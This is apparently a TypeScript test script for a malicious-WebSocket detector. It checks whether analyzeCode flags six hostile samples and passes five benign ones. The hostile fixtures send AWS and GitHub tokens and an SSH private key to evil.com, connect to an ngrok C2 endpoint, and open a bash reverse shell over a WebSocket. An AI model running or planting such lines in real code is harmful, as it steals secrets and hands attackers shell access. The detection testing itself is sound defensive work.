import { analyzeCode } from './src/analyzer.ts';

// Test malicious WebSocket cases (should detect)
const maliciousCases = [
  // Case 1: WebSocket to ngrok C2
  `const ws = new WebSocket('wss://abc123.ngrok.io/c2');`,
  // Case 2: WebSocket sending env vars
  `const ws = new WebSocket('wss://evil.com'); ws.send(process.env.AWS_SECRET_KEY);`,
  // Case 3: WebSocket sending base64 encoded data
  `const ws = new WebSocket('wss://evil.com'); ws.send(Buffer.from(fs.readFileSync('/root/.ssh/id_rsa')).toString('base64'));`,
  // Case 4: Reverse shell over WebSocket
  `const ws = new WebSocket('wss://evil.com/shell');
  const shell = spawn('/bin/bash');
  shell.stdout.pipe(ws);
  ws.pipe(shell.stdin);`,
  // Case 5: WebSocket to reverse shell domain
  `import WebSocket from 'ws'; const ws = new WebSocket('wss://reverse-shell.example.com/connect');`,
  // Case 6: WebSocket sending credentials
  `ws.send(JSON.stringify({ token: process.env.GITHUB_TOKEN }));`,
];

// Test legitimate WebSocket cases (should NOT detect / low severity only)
const legitimateCases = [
  // Case 1: WebSocket to Pusher (legitimate realtime service)
  `const ws = new WebSocket('wss://ws.pusherapp.com/app/abc123');`,
  // Case 2: WebSocket to localhost for dev
  `const ws = new WebSocket('ws://localhost:3000/ws');`,
  // Case 3: WebSocket sending ping
  `ws.send('ping');`,
  // Case 4: WebSocket sending event data (non-sensitive)
  `ws.send(JSON.stringify({ event: 'message', data: { text: 'hello' } }));`,
  // Case 5: WebSocket to Socket.io
  `import io from 'socket.io-client'; const socket = io('https://example.com');`,
];

console.log('=== Testing Malicious WebSocket Cases ===');
maliciousCases.forEach((code, i) => {
  const results = analyzeCode(code);
  console.log(`\nTest case ${i+1}:`);
  console.log(`Code: ${code.slice(0, 100)}${code.length > 100 ? '...' : ''}`);
  console.log(`Findings: ${results.length > 0 ? results.map(r => `${r.name} (${r.severity})`).join(', ') : 'NONE'}`);
  console.log(`Result: ${results.length > 0 ? '✅ DETECTED' : '❌ NOT DETECTED'}`);
});

console.log('\n=== Testing Legitimate WebSocket Cases ===');
legitimateCases.forEach((code, i) => {
  const results = analyzeCode(code);
  // Filter out low severity WS_IMPORT pattern
  const criticalFindings = results.filter(r => r.severity !== 'low');
  console.log(`\nTest case ${i+1}:`);
  console.log(`Code: ${code.slice(0, 100)}${code.length > 100 ? '...' : ''}`);
  console.log(`Findings (non-low): ${criticalFindings.length > 0 ? criticalFindings.map(r => `${r.name} (${r.severity})`).join(', ') : 'NONE'}`);
  console.log(`Result: ${criticalFindings.length === 0 ? '✅ LEGITIMATE (no false positive)' : '❌ FALSE POSITIVE'}`);
});
